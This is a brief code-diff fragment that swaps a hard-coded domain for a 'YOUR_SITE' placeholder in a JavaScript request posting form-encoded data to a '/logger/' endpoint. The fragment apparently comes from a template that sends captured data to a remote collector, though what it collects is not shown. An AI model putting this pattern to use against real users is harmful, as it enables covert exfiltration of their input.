@@ -192,7 +192,7 @@
 				//
 				var xhr = new XMLHttpRequest();
 			
-						xhr.open('POST', 'https://dr4cun0.com/logger/', true);
+						xhr.open('POST', 'https://YOUR_SITE/logger/', true);
 			
 						//xhr.overrideMimeType('application/json');
 						xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
